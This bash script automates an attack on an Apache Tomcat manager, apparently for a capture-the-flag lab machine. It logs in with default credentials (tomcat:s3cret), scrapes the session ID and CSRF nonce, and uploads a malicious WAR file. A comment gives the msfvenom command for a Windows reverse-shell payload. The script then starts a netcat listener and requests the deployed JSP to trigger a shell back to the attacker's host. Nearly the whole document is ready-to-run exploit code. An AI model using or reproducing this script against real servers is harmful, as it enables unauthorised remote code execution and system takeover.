#!/usr/bin/bash

# date: 04 feb 2023
# notes: 
# - you need to have terminator installed to be able to excecute nc in a new terminal window
#   thats because... idk how to put nc in the background without fucking up the shellscript
# - if the shellscript fails, maybe you'll need to uncomment proxy flags in curls requests to see wtf its going on
#   for now, this script is working nice for me, so im happy :)
# - no checks implemented in this script, so be shure you have specified and created all needed like
#   the payload file or everything else before executing this script.


# change this variables if necessary
TARGET="http://10.10.10.95:8080/"
TARGET_PATH="/manager/html"
PAYLOAD="./payload.war" 
SWEET=$( unzip -l ${PAYLOAD} | grep -o [a-zA-Z0-9]*\.jsp )
LHOST="10.10.16.10"
LPORT=12345

# to generate the payload with msfvenom use
# msfvenom -p windows/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o payload.war

# basic auth required
USERNAME=tomcat
PASSWORD=s3cret

echo "[!] Getting session ID and CSRF_TOKEN"
info=$( curl -u ${USERNAME}:${PASSWORD} -s -i  ${TARGET}${TARGET_PATH} ) #--proxy http://localhost:8080 )
JSESSIONID=$( echo "${info}" | grep -o "JSESSIONID=.*" | tr "=" " " | cut -d " " -f 2 | tr -d "o;" )
CSRF_NONCE=$( echo "${info}" | grep -o CSRF_NONCE=[A-Z0-9]* | head -n 1 | tr "=" " " | cut -d " " -f 2 )

if [[ -z ${JSESSIONID} || -z ${CSRF_NONCE} ]];then
   echo -e "[X] \e[31mUnable to obtain CSRF_TOKEN or JSESSIONID\e[0m"
   exit
else
   echo -e "[!] JSESSIONID=\e[32m$( echo "${JSESSIONID}" | tr "=" " " | cut -d " " -f 2 ) \e[0m"
   echo -e "[!] CSRF_NONCE=\e[32m$( echo "${CSRF_NONCE}" | tr "=" " " | cut -d " " -f 2 ) \e[0m"
fi

# generating boundary
boundary=""
for i in $(seq 30);do
   boundary=${boundary}$(expr ${RANDOM} % 10)
done
boundary="---------------------------${boundary}"

# uploading file
curl -s -k -X POST -u ${USERNAME}:${PASSWORD} \
   -H "User-Agent: yoMAMA" \
   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
   -H "Referer: ${TARGET}${TARGET_PATH}/undeploy?path=/payload&org.apache.catalina.filters.CSRF_NONCE=${CSRF_NONCE}" \
   -b "JSESSIONID=${JSESSIONID}" \
   -F deployWar=@${PAYLOAD} \
   "${TARGET}${TARGET_PATH}/upload;jsessionid=${JSESSIONID}?org.apache.catalina.filters.CSRF_NONCE=${CSRF_NONCE}" >/dev/null \
   #--proxy http://localhost:8080  


terminator -x "nc -lvnp ${LPORT} "

curl -u ${USERNAME}:${PASSWORD} -s ${TARGET}payload/${SWEET} \
   -b "JSESSIONID=${JSESSIONID}" \
   #--proxy http://localhost:8080  

